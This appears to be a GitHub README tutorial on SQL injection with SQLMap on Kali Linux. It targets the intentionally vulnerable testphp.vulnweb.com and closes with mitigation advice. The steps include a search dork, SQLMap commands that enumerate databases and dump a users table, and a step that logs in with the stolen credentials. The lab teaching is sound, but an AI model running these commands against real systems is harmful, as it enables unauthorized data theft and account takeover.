# SQL Injection using SQLMap in Kali Linux

## Overview
This project demonstrates how SQL injection can be used to exploit vulnerable web applications and website databases. The goal is to provide educational insights into the process.

> **Disclaimer:** This project was conducted on a sample website. The information in this document is for educational purposes only and should not be used for unethical or illegal activities.

## Objectives
- Identify SQL injection vulnerabilities in a sample environment.
- Extract sample credentials.
- Explore mitigation strategies.

---

## What is SQL Injection?
SQL Injection (SQLi) is a web security vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code into input fields. This can lead to data theft, authentication bypass, or even full database control.

## Tools Used
- **Kali Linux** – A Linux distribution designed for penetration testing.
- **SQLMap** – An automated tool used to detect and exploit SQL injection vulnerabilities.

## Process Description

### Step 1: Update Kali Linux
Ensure all system packages are up-to-date using:
```bash
sudo apt update && sudo apt upgrade -y
```
Verify if SQLMap is installed:
```bash
sqlmap --version
```
If not installed, use:
```bash
sudo apt install sqlmap
```

### Step 2: Identify a Target
We use **vulnweb.com** as our test target.
1. Open a web browser and navigate to `http://testphp.vulnweb.com`.
2. Look for a webpage with a query parameter (e.g., `?id=`) by using:
   ```
   site:testphp.vulnweb.com inurl:"id="
   ```

### Step 3: Run SQLMap
Execute SQLMap to test for vulnerabilities:
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```
If the site is vulnerable, SQLMap will return a list of available databases.

### Step 4: Extract Data
Once a vulnerable database is found, retrieve its tables:
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```
Dump data from a specific table (e.g., `users`):
```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
```
If successful, the extracted data will include usernames and hashed passwords.

### Step 5: Login Using Extracted Credentials
Using the extracted credentials, log into the website’s login page. **Note:** This step is for educational purposes only.

---

## Mitigation Strategies
To prevent SQL Injection attacks, consider implementing the following measures:

1. **Use Prepared Statements** – Prevent direct SQL execution by using safe database query methods like **PHP PDO**.
2. **Use ORM Frameworks** – Utilize Object-Relational Mapping (ORM) tools like **SQLAlchemy** or **Eloquent** to prevent direct SQL queries.
3. **Web Application Firewall (WAF)** – Deploy solutions like **Cloudflare WAF** or **ModSecurity** to filter malicious SQL queries.
4. **Input Validation & Whitelisting** – Validate user input to ensure it adheres to the expected format.
5. **Hide Error Messages** – Avoid exposing database errors that could provide attackers with insights into the database structure.
6. **Monitor & Log SQL Queries** – Detect suspicious SQL queries in real time.
7. **Rate Limiting & Captchas** – Restrict login attempts and query execution rates to prevent automated attacks.

---

## Legal Disclaimer
This project is strictly for educational purposes. Unauthorized access to any system without permission is illegal and punishable by law.

## License
This project is licensed under the [MIT License](LICENSE).

## Author
[karmaend] - Cybersecurity Enthusiast
